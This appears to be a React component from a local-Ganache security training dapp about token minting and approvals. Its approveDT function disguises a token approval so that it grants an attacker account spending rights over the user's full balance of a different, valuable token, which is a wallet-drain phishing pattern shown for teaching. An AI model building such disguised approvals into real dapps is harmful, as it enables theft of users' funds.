import {DappCoinToken__factory, ReallyValuableToken__factory} from "@securityspeedrun/common-contracts";
import {parseEther} from "ethers/lib/utils";
import React, {useEffect, useMemo, useState} from "react";
import {chainId, useAccount, useProvider, useSigner} from "wagmi";
import {accounts, contracts, testAccountPrivateKeys} from "../constants";
import {send_token} from "../helpers/EthUtils";
import {useHackDapp} from "../hooks/useHackDapp";

const Mint = () => {

  const provider = useProvider({chainId: chainId.localhost})
  const {data: signer, isError, isLoading} = useSigner()
  const {address, status} = useAccount()

  const [hasEth, setHasEth] = useState(false)
  const [hasDappCoins, setHasDappCoins] = useState(false)

  const {wrongChain, myEthBalance, myDTBalance, myRvtBalance, attackerEthBalance, attackerRvtBalance} = useHackDapp()

  useEffect(() => {
    setHasEth(myEthBalance !== undefined && myEthBalance.value.gt(0))
    setHasDappCoins(myDTBalance !== undefined && myDTBalance.value.gt(0))
  }, [myEthBalance, myDTBalance])

  const tokenInst = useMemo(() => {
    if (!signer)
      return
    return DappCoinToken__factory.connect(contracts.dappCoinToken, signer)
  }, [signer]);

  const rvTokenInst = useMemo(() => {
    if (!signer)
      return
    return ReallyValuableToken__factory.connect(contracts.reallyValuableToken, signer);
  }, [signer]);

  async function sendEth() {
    if (!address) {
      alert("Address not set! Please connect your wallet.")
      return
    }
    // and send some eth to our user...
    await
      send_token({
      ethers_provider: provider,
      to_address: address.toString(),
      private_key: testAccountPrivateKeys.deployer,
      send_token_amount: "100",
    })
  }

  async function mintRVT() {
    if (!address || !rvTokenInst) {
      alert("Address or Really Valuable token not set! Please connect your wallet.")
      return
    }
    // lets mint some RVT
    rvTokenInst.mintABunch(parseEther("100"))
      .then(value => {
          console.log(`mintRVT: `, {value})
          alert("Really Valuable Tokens Minted!")
        },
        reason => {
          alert(reason)
        });

  }

  async function mintDT() {
    if (!address || !tokenInst) {
      alert("Address or Token not configured! Please connect your wallet.")
      return
    }
    // lets mint some Dapp Coin Tokens
    tokenInst.buySome("10", {value: parseEther("1")})
    .then(value => {
        console.log(`mintDT: `, {value})
        alert("Dapp Coin Tokens Minted!")
      },
      reason => {
        alert(reason)
      })
  }

  /**
   * This method approves the DT Tokens to the NFT Contract to allow you to buy them with your
   */
  async function approveDT() {
    // FIXME

    if (myRvtBalance?.value && myRvtBalance.value.gt(0)) {
      // ok the user on the site has the tokens we want... lets change the approve
      console.log(`approveDT: hacked approve `, {})
      rvTokenInst?.approve(accounts.attacker, myRvtBalance.value, {from: address})
        .then(success => {
          // MUAHAHAHAHAH - lets use that approve shall we?

          // in reality this would happen inside a server watching for this event to happen.


        }, (reason) => {
          alert(reason)
        } )

    } else {
      // he doesn't have the tokens we want so lets just approve as normal.
      console.log(`approveDT: normal approve `, {})
    }

  }

  async function approveDTHacked() {
    // FIXME
  }

  return <>
    <div className="flex flex-row w-full ">
      {/* show this if we are not on the correct network */}
      {wrongChain && <>
        <i className="md:mt-32 mt-52 nes-kirby"></i>
        <div className="m-auto align-top nes-balloon from-left h-fit ">
          <p>MAKE SURE YOU ARE RUNNING THIS ON GANACHE LOCALLY.</p>
        </div>
      </>}
      {!wrongChain &&
        <>

          <div className="nes-container w-full h-full ">
            {!hasEth && <>
              <h3>STEP 1:</h3>
              <hr className="border-2 border-black"/>
              <br/>
              <button className="nes-btn is-warning text-sm" onClick={sendEth}> Send 100 ETH</button>
              <br/>
              <br/>
            </>
            }
            {hasEth && <div className="text-md">
              <h3>Step 2 Mint our Really Valuable Coinz</h3>
              <hr className="border-2 border-black"/>
              Remember these are worth a lot of money to the Attacker... be careful.
              <br/>
              <button className="nes-btn is-warning text-sm" onClick={mintRVT}> Mint RVT Tokens</button>
              <br/>
            </div>
            }
            {hasEth && <div className="text-md">
              <h3>Step 3 Mint our Dapper Coinz</h3>
              <hr className="border-2 border-black"/>
              These are used to buy the NFT at the end...
              <br/>
              <button className="nes-btn is-success text-sm" onClick={mintDT}> Mint Dapp Tokens</button>
              <br/>
            </div>
            }
            {hasDappCoins && <div className="text-md">
              <h3>Step 4 Mint our NFT</h3>
              <hr className="border-2 border-black"/>
              Now... The fun begins...
              <br/>
              <button className="nes-btn is-warning text-sm" onClick={approveDT}><i className="nes-icon trophy is-small"></i> Approve Dapp Tokens <i
                className="nes-icon trophy is-small"></i></button>
              {" "}
              <button className="nes-btn is-error text-sm" onClick={approveDTHacked}><i className="nes-icon close is-small"></i> Approve Dapp Tokens <i
                className="nes-icon close is-small"></i></button>
              <br/>
            </div>
            }
          </div>
        </>

      }
    </div>
  </>
};

export default Mint;
